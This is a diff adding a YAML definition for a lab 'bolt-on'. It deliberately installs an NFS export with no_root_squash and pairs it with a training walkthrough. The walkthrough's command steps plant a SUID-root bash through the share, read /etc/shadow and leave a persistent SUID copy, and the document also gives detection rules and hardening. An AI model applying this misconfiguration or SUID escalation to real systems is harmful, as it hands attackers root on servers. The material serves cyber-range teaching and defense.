@@ -1,0 +1,560 @@
+# Bolt-on: NFS Export with no_root_squash
+# ---------------------------------------
+# Install appends a /srv/bolton-share NFS export with no_root_squash to
+# /etc/exports and re-runs `exportfs -ra`. Any NFS client that mounts
+# the share as root can then write SUID-root binaries into it, mount
+# the share locally, and execute them for instant root — classic
+# no_root_squash exploitation (T1210).
+#
+# Patch removes the bad line and drops /etc/exports.d/secure.exports
+# pinning `root_squash` and `secure` as defaults for the directory.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/discovery_manual_mount_discovery_via_exports_or_fstab.toml
+#   Research/elastic-detection-rules/rules/linux/defense_evasion_suspicious_path_mounted.toml
+
+id: bolton.service-misconfig.nfs-no-root-squash
+slug: nfs-no-root-squash
+name: "NFS Export with no_root_squash"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: service-misconfig
+subcategory: nfs
+tags:
+  - nfs
+  - no-root-squash
+  - service-misconfig
+  - privilege-escalation
+  - linux
+description: >
+  Appends `/srv/bolton-share *(rw,no_root_squash,no_subtree_check)` to
+  /etc/exports and re-runs `exportfs -ra`. Without root_squash, a remote
+  client mounting the share as uid=0 writes files OWNED BY ROOT on the
+  server. The standard exploit: client mounts share, drops a
+  setuid-root /bin/sh, mounts the share on a victim with execute, runs
+  the planted binary — instant root (MITRE T1210).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1210/"
+  - "https://linux.die.net/man/5/exports"
+  - "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"
+
+mitre:
+  tactic:
+    id: TA0008
+    name: "Lateral Movement"
+  technique:
+    id: T1210
+    name: "Exploitation of Remote Services"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "bd18f4a3-c4c6-43b9-a1e4-b05e09998110"
+      rule_name: "Manual Mount Discovery via /etc/exports or /etc/fstab"
+      rule_filename: "linux/discovery_manual_mount_discovery_via_exports_or_fstab.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Catches the recon step (cat /etc/exports, showmount -e) attackers run before exploiting."
+    - rule_uuid: "68e90a9b-0eab-425e-be3b-902b0cd1fe9c"
+      rule_name: "Suspicious Path Mounted"
+      rule_filename: "linux/defense_evasion_suspicious_path_mounted.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Fires on the client-side mount step when the share is mounted to an unusual location for exploitation."
+  signal_sources:
+    - "Auditd FILE_WRITE on /etc/exports"
+    - "Auditd execve of /usr/sbin/exportfs with -ra"
+    - "rpcbind log — MOUNT call from non-allowlisted client to /srv/bolton-share"
+    - "Auditd FILE_CREATE on /srv/bolton-share/* with uid=0 from remote nfs server thread"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services:
+    - nfs-kernel-server
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: true
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Ensure /srv/bolton-share exists with permissive mode."
+      role_vars:
+        path: "/srv/bolton-share"
+        state: directory
+        owner: root
+        group: root
+        mode: "0777"
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Append the no_root_squash export line."
+      role_vars:
+        path: "/etc/exports"
+        line: "/srv/bolton-share *(rw,no_root_squash,no_subtree_check)"
+        state: present
+        create: true
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: ansible.builtin.command
+      description: "Re-export shares."
+      role_vars:
+        cmd: "/usr/sbin/exportfs -ra"
+  verify:
+    probe: |
+      showmount -e localhost 2>/dev/null | grep -q "/srv/bolton-share"
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the no_root_squash export line and re-export."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Strip the bolton export line."
+      role_vars:
+        path: "/etc/exports"
+        regexp: "^/srv/bolton-share\\s.*"
+        state: absent
+    - ansible_role: ansible.builtin.command
+      description: "Re-export shares."
+      role_vars:
+        cmd: "/usr/sbin/exportfs -ra"
+  verify:
+    probe: |
+      showmount -e localhost 2>/dev/null | grep -q "/srv/bolton-share" && exit 1 || exit 0
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Strip the bad line, re-export, and drop /etc/exports.d/secure.exports
+    that re-exports /srv/bolton-share with `root_squash,all_squash,
+    anonuid=65534,anongid=65534,secure,no_subtree_check`. Squashes any
+    remote root to nobody:nogroup. Also installs an
+    /etc/cron.daily/bolton-nfs-audit script that greps for no_root_squash
+    in /etc/exports{,.d/*} and syslog-warns on any match.
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1037/"
+    - "https://linux.die.net/man/5/exports"
+  complexity: low
+  side_effects:
+    - "Daily cron job at ~06:25 syslog-warns on any future no_root_squash entry"
+    - "/srv/bolton-share remains exported but with root_squash + all_squash to nobody"
+    - "Any client process writing to the share lands as uid=65534"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Strip the bad export line."
+      role_vars:
+        path: "/etc/exports"
+        regexp: "^/srv/bolton-share\\s.*"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Drop a hardened drop-in export."
+      role_vars:
+        dest: "/etc/exports.d/secure.exports"
+        content: |
+          # bolton — hardened re-export of /srv/bolton-share
+          /srv/bolton-share *(rw,root_squash,all_squash,anonuid=65534,anongid=65534,secure,no_subtree_check)
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: ansible.builtin.command
+      description: "Re-export shares."
+      role_vars:
+        cmd: "/usr/sbin/exportfs -ra"
+    - ansible_role: ansible.builtin.copy
+      description: "Install daily no_root_squash audit."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-nfs-audit"
+        content: |
+          #!/bin/sh
+          # bolton-nfs-audit — warn on any no_root_squash entry
+          for f in /etc/exports /etc/exports.d/*; do
+            [ -f "$f" ] || continue
+            if grep -Eq "no_root_squash" "$f"; then
+              logger -t bolton-nfs-audit "WARNING: no_root_squash in $f"
+            fi
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      ! grep -E "no_root_squash" /etc/exports /etc/exports.d/* 2>/dev/null | grep -q . && showmount -e localhost 2>/dev/null | grep -q "/srv/bolton-share" && test -x /etc/cron.daily/bolton-nfs-audit
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/nfs_root_squash_check.sh"
+
+patch_revert:
+  description: "Remove the hardened export + audit, re-add no_root_squash — remote root SUID write attack works again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the audit script."
+      role_vars:
+        path: "/etc/cron.daily/bolton-nfs-audit"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove the hardened export drop-in."
+      role_vars:
+        path: "/etc/exports.d/secure.exports"
+        state: absent
+    - ansible_role: ansible.builtin.lineinfile
+      description: "Re-add the no_root_squash export line."
+      role_vars:
+        path: "/etc/exports"
+        line: "/srv/bolton-share *(rw,no_root_squash,no_subtree_check)"
+        state: present
+        create: true
+    - ansible_role: ansible.builtin.command
+      description: "Re-export shares."
+      role_vars:
+        cmd: "/usr/sbin/exportfs -ra"
+  verify:
+    probe: |
+      grep -E "no_root_squash" /etc/exports 2>/dev/null | grep -q "/srv/bolton-share"
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Remote NFS clients mounting /srv/bolton-share as root can plant SUID-root binaries again."
+
+cost:
+  storage_mb: 5
+  cpu_pct: 1
+  detectability: loud
+
+curriculum:
+  title: "NFS no_root_squash → Remote Root via SUID Drop"
+  summary: >
+    Walkthrough of T1210 against tllinux01 (10.99.50.13) acting as
+    NFS server, with Kali (192.168.1.100) as the client. You
+    discover the no_root_squash export, mount it as local root from
+    Kali, write a SUID-root binary into the share, mount it back
+    on the server (or trigger execution via any user there), and
+    pop root. Final step covers root_squash + all_squash hardening
+    and an exports-file auditor.
+  learning_objectives:
+    - "Enumerate NFS exports remotely with showmount."
+    - "Mount an NFS export from Kali and confirm uid translation behavior."
+    - "Plant a SUID-root /bin/bash via the no_root_squash hole."
+    - "Trigger SUID execution as a low-priv user on the server side."
+    - "Map to Elastic's exports-discovery and suspicious-mount rules."
+    - "Re-export with root_squash + all_squash and deploy an exports-file auditor."
+  prerequisites:
+    - "Kali attack box (192.168.1.100) with nfs-common installed"
+    - "Network reachability: Kali → tllinux01:2049 (typically via VPN/peering)"
+    - "Low-priv SSH access (appuser) to tllinux01 to trigger the planted SUID binary"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-recon-exports"
+      title: "Recon: enumerate NFS exports"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Discover the exports remotely
+
+        ```bash
+        # On Kali (192.168.1.100)
+        showmount -e 10.99.50.13
+        # Export list for 10.99.50.13:
+        # /srv/bolton-share *
+        ```
+
+        showmount queries the rpc.mountd service on tcp/2049 (or
+        the legacy rpcbind port-mapped service). The `*` means
+        ANY client may mount — not even a CIDR allowlist.
+
+        Detailed enumeration to confirm the no_root_squash flag is
+        local on the server:
+
+        ```bash
+        # On tllinux01 as appuser
+        cat /etc/exports
+        # /srv/bolton-share *(rw,no_root_squash,no_subtree_check)
+        ```
+
+        That `no_root_squash` is the entire vulnerability. Without
+        it, NFS server kernel-level remaps any incoming uid 0
+        request to uid 65534 (nobody). WITH it, uid 0 on the
+        client writes files OWNED BY ROOT on the server. Combined
+        with rw, that means you can write any file the server's
+        root can write.
+
+        linpeas / lse / LinEnum all surface NFS server config
+        automatically:
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A5 "NFS"
+        ```
+
+        **Detection callout:** **Manual Mount Discovery via
+        /etc/exports or /etc/fstab**
+        (`bd18f4a3-c4c6-43b9-a1e4-b05e09998110`) catches the
+        `cat /etc/exports` recon — indirect signal that someone
+        is mapping the export surface.
+      assessment:
+        question: "What does `no_root_squash` actually disable?"
+        options:
+          - "Compression on NFS traffic"
+          - "The kernel's default behaviour of remapping incoming uid 0 requests to uid 65534 (nobody) at the server, so client-root retains root identity on the server"
+          - "Encryption of NFS traffic"
+          - "Root user authentication via Kerberos"
+        correct_index: 1
+        explanation: >
+          By default the NFS server kernel translates incoming
+          uid=0 requests to anonymous (anonuid=65534, anongid=65534)
+          before applying the filesystem permission check. This is
+          called "root squashing" and is the cornerstone of NFS
+          security. no_root_squash disables that translation —
+          client-root requests are honoured AS root at the server.
+          The client doesn't need to authenticate as anyone; they
+          just need to be uid=0 locally, which is trivial.
+    - id: "02-mount-write"
+      title: "Mount and write a SUID-root binary"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Mount + plant the SUID binary
+
+        ```bash
+        # On Kali (192.168.1.100) as root (or via sudo)
+        sudo apt-get install -y nfs-common
+        sudo mkdir -p /mnt/loot
+        sudo mount -t nfs -o vers=3 10.99.50.13:/srv/bolton-share /mnt/loot
+
+        # Verify mount + write permission as root on Kali
+        sudo touch /mnt/loot/.iam-root && ls -la /mnt/loot/.iam-root
+        # -rw-r--r-- 1 root root 0 ... /mnt/loot/.iam-root
+        ```
+
+        Note: on the SERVER side, `.iam-root` is owned by uid=0
+        (root). That's the no_root_squash effect in action.
+
+        Now plant a SUID-root bash:
+
+        ```bash
+        # Still on Kali as root
+        sudo cp /bin/bash /mnt/loot/.bsh
+        sudo chmod 4755 /mnt/loot/.bsh
+        sudo ls -la /mnt/loot/.bsh
+        # -rwsr-xr-x 1 root root 1265688 ... /mnt/loot/.bsh
+        ```
+
+        > **Why nfs vers=3?** NFSv4 has uid mapping via idmapd that
+        > can interfere with the raw uid passthrough. v3 is the
+        > path of least resistance for the classic exploit. If
+        > only v4 is exported, you may need `sec=sys` and matching
+        > /etc/idmapd.conf.
+
+        On the server, the SUID binary is now world-executable AND
+        SUID-root:
+
+        ```bash
+        # On tllinux01 as appuser (or any non-root)
+        ls -la /srv/bolton-share/.bsh
+        # -rwsr-xr-x 1 root root 1265688 ... .bsh
+        ```
+
+        **Detection callout:** auditd FILE_CREATE on
+        /srv/bolton-share/* with uid=0 originating from the nfs
+        server thread is the highest-fidelity install signal —
+        custom rule needed: `-a always,exit -F arch=b64 -S
+        creat,open -F dir=/srv/bolton-share -F uid=0 -k nfs_write`.
+        Cross-reference with the source IP from the nfs kernel
+        log to attribute to the client.
+    - id: "03-trigger-suid"
+      title: "Trigger the SUID binary on the server"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — Execute the SUID-root binary on the server
+
+        ```bash
+        # On tllinux01 as appuser (via SSH through bastion)
+        /srv/bolton-share/.bsh -p
+        bash-5.1# id
+        uid=1001(appuser) gid=1001(appuser) euid=0(root) groups=1001(appuser)
+        bash-5.1# cat /etc/shadow | head -3
+        root:$6$...
+        ```
+
+        Bash again needs `-p` to keep euid=0 (because ruid !=
+        euid). Drop a SUID-cp into a more durable location if
+        the share might be unmounted:
+
+        ```bash
+        bash-5.1# cp /srv/bolton-share/.bsh /tmp/.persist-bsh
+        bash-5.1# ls -la /tmp/.persist-bsh
+        # -rwsr-xr-x 1 root root ... /tmp/.persist-bsh   ← preserves SUID via cp
+        bash-5.1# exit
+        ```
+
+        > **Server-side execute requirement:** /srv/bolton-share
+        > must be mounted on the server WITHOUT `nosuid`. The
+        > bolt-on doesn't set nosuid on the export; if a hardened
+        > host did, the SUID bit would be ignored at execve and
+        > this step would fail. The mitigation `nosuid,nodev,noexec`
+        > on /srv/bolton-share is a useful hardening even if you
+        > can't remove no_root_squash.
+
+        **Detection callout:** the SUID execve from non-system
+        directory by non-root with euid=0 is caught by Elastic's
+        SUID/SGID escalation rules — see the suid-binary-gtfobins
+        bolt-on for the same signature.
+      assessment:
+        question: "Why does the SUID binary written via NFS work on the server, when the writer is a Kali host with no local account on the server?"
+        options:
+          - "NFS automatically syncs user accounts between client and server"
+          - "The SUID bit is interpreted at execve time on the server by the local kernel, which only cares about file ownership (root, set via no_root_squash) and the SUID bit — it doesn't care WHO wrote the file"
+          - "The server kernel trusts Kali's local kernel"
+          - "NFS opens a kernel tunnel that makes Kali's uid 0 valid on the server"
+        correct_index: 1
+        explanation: >
+          The SUID bit is a property of the file inode. At execve,
+          the server's kernel checks: (a) is the file SUID? Yes.
+          (b) Who owns it? root (because no_root_squash let Kali's
+          uid=0 write as root). The kernel then sets the new
+          process's euid to the file owner's uid (0). It doesn't
+          matter that Kali has no account on the server, nor that
+          the server has never seen this user — the SUID mechanism
+          is purely about the file's metadata.
+    - id: "04-detection-coverage"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        | Stage | Signal | Confidence |
+        |---|---|---|
+        | Install (FILE_WRITE) | auditd write to /etc/exports | High |
+        | Install (exportfs -ra) | auditd execve of /usr/sbin/exportfs with -ra | High |
+        | Recon (showmount from Kali) | rpcbind log entry from non-allowlisted IP | Medium |
+        | Mount (Kali side) | nfsd kernel log: client 192.168.1.100 mounted /srv/bolton-share | Medium |
+        | Plant (FILE_CREATE) | auditd write to /srv/bolton-share/* with uid=0 from nfs thread | High |
+        | Trigger (SUID exec) | execve of /srv/bolton-share/.bsh with euid=0 from non-root parent | High |
+
+        Defender recipe:
+
+        - **Audit /etc/exports** continuously — the bolt-on's
+          patch deploys `/etc/cron.daily/bolton-nfs-audit` which is
+          exactly this.
+        - **rpcbind logging** is critical — without it, you have
+          no visibility on remote mount calls. Set
+          `rpcbind -w -d` for the daemon.
+        - **Auditd on the export dir** with a tight watch:
+          `-w /srv/bolton-share -p wa -k nfs_dir_w`.
+        - **Network-layer**: alert on tcp/2049 traffic from
+          non-allowlisted client IPs (this is the cleanest signal).
+
+        Detection gap: the Elastic public ruleset has only
+        indirect coverage of NFS abuse (manual mount discovery,
+        suspicious-path mount). The export-side detection has to
+        be custom — Sigma rules for NFS export changes exist but
+        require additional plumbing.
+    - id: "05-patch-mitigate"
+      title: "Blue-team: root_squash + exports auditor"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Strips the `no_root_squash` line from /etc/exports.
+        2. Drops `/etc/exports.d/secure.exports` re-exporting
+           /srv/bolton-share with
+           `rw,root_squash,all_squash,anonuid=65534,anongid=65534,secure,no_subtree_check`.
+        3. Re-runs `exportfs -ra`.
+        4. Drops `/etc/cron.daily/bolton-nfs-audit` that greps
+           every export file for `no_root_squash` and syslog-warns
+           on any match.
+
+        Re-test from Kali:
+
+        ```bash
+        # On Kali
+        sudo umount /mnt/loot
+        sudo mount -t nfs -o vers=3 10.99.50.13:/srv/bolton-share /mnt/loot
+
+        sudo touch /mnt/loot/.iam-root && ls -la /mnt/loot/.iam-root
+        # -rw-r--r-- 1 nobody nogroup 0 ... .iam-root   ← squashed to anonymous
+
+        sudo cp /bin/bash /mnt/loot/.bsh
+        sudo chmod 4755 /mnt/loot/.bsh
+        sudo ls -la /mnt/loot/.bsh
+        # -rwsr-xr-x 1 nobody nogroup ... .bsh   ← SUID set but owned by nobody
+        ```
+
+        The SUID bit is set but the file is owned by uid=65534
+        (nobody). SUID escalates to the FILE OWNER's uid — here,
+        nobody. Try it on the server:
+
+        ```bash
+        # On tllinux01 as appuser
+        /srv/bolton-share/.bsh -p
+        bash-5.1$ id
+        uid=1001(appuser) gid=1001(appuser) euid=65534(nobody) groups=1001(appuser)
+        # ^ euid=65534, not 0 — useless for privilege escalation
+        ```
+
+        Exploit dead. Verify the auditor:
+
+        ```bash
+        sudo /etc/cron.daily/bolton-nfs-audit
+        # (silent — no no_root_squash entries)
+        ```
+
+        Defence-in-depth recommendations:
+
+        - **NEVER** use `no_root_squash` — there is essentially no
+          legitimate use case in 2026. If you genuinely need
+          remote root-equivalent access, use SSH + sudo.
+        - **Pin exports to specific client CIDRs**:
+          `/srv/share 10.0.20.0/24(rw,root_squash)` — never `*`.
+        - **Mount the export filesystem with `nosuid,nodev`** on
+          the SERVER so even if a SUID binary slips in, it can't
+          execute as elevated.
+        - **Use NFSv4 + Kerberos (`sec=krb5p`)** for any
+          security-sensitive deployment. NFSv3 + AUTH_SYS is
+          essentially trust-by-IP.
+        - **`secure` export option** restricts the client port to
+          < 1024 (requires root on the client to mount) — a
+          weak signal but defense in depth.
+
+        > **Rollback:** `patch_revert` removes the hardened export
+        > and the audit, re-adds no_root_squash, and re-exports.
+      assessment:
+        question: "Which combination of mount/export options provides the strongest defence against the no_root_squash exploit pattern, short of removing the export?"
+        options:
+          - "all_squash + nosuid mount of the source filesystem on the server + sec=krb5 + IP allowlist"
+          - "root_squash alone"
+          - "Encryption at rest on the export"
+          - "Switching to SMB instead of NFS"
+        correct_index: 0
+        explanation: >
+          Defence in depth: all_squash maps EVERY incoming uid to
+          nobody (not just root), so even uid=1000 writes land as
+          nobody — no chance of impersonating a legit user. nosuid
+          on the server-side mount of /srv/bolton-share means SUID
+          bits are ignored at execve regardless of who writes them.
+          sec=krb5 requires Kerberos-authenticated NFS traffic,
+          defeating IP-based spoofing. IP allowlist limits the
+          attack surface to known clients. Any ONE of these is
+          insufficient; all four stacked is the production pattern.
+
+status: stable
